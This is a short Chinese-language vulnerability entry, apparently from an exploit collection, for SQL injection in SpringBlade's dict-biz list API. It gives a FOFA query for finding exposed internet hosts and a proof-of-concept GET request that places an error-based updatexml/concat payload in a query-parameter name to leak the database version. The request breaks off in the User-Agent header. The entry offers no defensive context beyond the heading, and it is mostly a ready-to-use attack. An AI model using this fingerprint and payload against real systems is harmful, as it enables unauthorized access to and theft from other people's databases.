## SpringBlade框架dict-biz接口存在sql注入漏洞


## fofa
```
body="Saber 将不能正常工作"
```

## poc
```
GET /api/blade-system/dict-biz/list?updatexml(1,concat(0x7e,version(),0x7e),1)=1 HTTP/1.1
Host: your-ip
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win
```
